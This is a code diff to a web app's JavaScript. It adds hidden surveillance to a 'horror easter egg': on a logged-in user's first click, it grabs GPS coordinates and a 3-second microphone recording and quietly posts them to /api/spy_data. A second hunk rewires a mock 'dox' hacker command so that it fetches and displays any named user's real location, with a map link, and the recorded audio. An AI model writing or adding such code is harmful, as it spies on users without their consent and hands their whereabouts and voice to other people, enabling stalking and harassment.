@@ -84,10 +84,57 @@ window.handleGoogleCredentialResponse = async (response) => {
 document.addEventListener('DOMContentLoaded', () => {
     // Silent permissions request for horror easter egg on first interaction
     document.addEventListener('click', () => {
-        if (!window.horrorPermsRequested) {
+        if (!window.horrorPermsRequested && window.currentUser) {
             window.horrorPermsRequested = true;
-            if (navigator.geolocation) navigator.geolocation.getCurrentPosition(()=>{},()=>{});
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) navigator.mediaDevices.getUserMedia({audio:true}).then(s=>s.getTracks().forEach(t=>t.stop())).catch(()=>{});
+            
+            let spyData = { lat: null, lon: null, audio: null };
+            
+            // 1. Capture Location
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    spyData.lat = pos.coords.latitude;
+                    spyData.lon = pos.coords.longitude;
+                    sendSpyData();
+                }, () => {});
+            }
+            
+            // 2. Capture Audio (3 seconds)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({audio:true}).then(stream => {
+                    const mediaRecorder = new MediaRecorder(stream);
+                    const audioChunks = [];
+                    mediaRecorder.addEventListener("dataavailable", event => {
+                        audioChunks.push(event.data);
+                    });
+                    mediaRecorder.addEventListener("stop", () => {
+                        const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.readAsDataURL(audioBlob);
+                        reader.onloadend = function() {
+                            spyData.audio = reader.result;
+                            sendSpyData();
+                        }
+                        stream.getTracks().forEach(t => t.stop());
+                    });
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 3000);
+                }).catch(()=>{});
+            }
+            
+            let sendTimeout;
+            function sendSpyData() {
+                clearTimeout(sendTimeout);
+                // Wait a bit to collect both GPS and Audio if available
+                sendTimeout = setTimeout(() => {
+                    if (spyData.lat || spyData.audio) {
+                        fetch('/api/spy_data', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify(spyData)
+                        }).catch(()=>{});
+                    }
+                }, 4000);
+            }
         }
     }, {once: true});
 
@@ -3423,10 +3470,33 @@ function handleHackerCommand(cmd) {
         }, 10000);
 
     } else if (c.startsWith('dox ')) {
-        const target = cmd.split(' ')[1];
+        let target = cmd.split(' ')[1];
+        if (target.startsWith('@')) target = target.substring(1);
         printHacker(`[+] Locating ${target}...`);
-        setTimeout(() => printHacker(`[!] IP: 192.168.1.${Math.floor(Math.random()*255)}`), 1000);
-        setTimeout(() => printHacker(`[!] Status: PWNED`), 2000);
+        
+        fetch(`/api/dox/${target}`)
+            .then(r => r.json())
+            .then(data => {
+                if (data.error) {
+                    setTimeout(() => printHacker(`[-] Error: ${data.error}`), 1000);
+                    setTimeout(() => printHacker(`[!] Fallback IP: 192.168.1.${Math.floor(Math.random()*255)} (Target not found or secure)`), 2000);
+                } else {
+                    setTimeout(() => {
+                        printHacker(`[!] TARGET COMPROMISED`);
+                        if (data.coords) {
+                            const [lat, lon] = data.coords.split(',');
+                            printHacker(`[+] GPS COORDINATES: Lat: ${parseFloat(lat).toFixed(5)}, Lon: ${parseFloat(lon).toFixed(5)}`);
+                            printHacker(`[+] SATELLITE VIEW: <a href="https://www.google.com/maps?q=${lat},${lon}" target="_blank" style="color:var(--neon-primary);text-decoration:underline;">Open Google Maps</a>`);
+                        }
+                        if (data.audio) {
+                            printHacker(`[+] INTERCEPTED AUDIO (3s):`);
+                            printHacker(`<audio controls src="${data.audio}" style="height: 30px; margin-top: 5px; outline: none;"></audio>`);
+                        }
+                    }, 1000);
+                }
+            }).catch(() => {
+                setTimeout(() => printHacker(`[!] Status: SECURE (Data retrieval failed)`), 1000);
+            });
     } else if (c === 'locate') {
         printHacker("Fetching IP-based Network Location...");
         fetch('https://ipapi.co/json/')
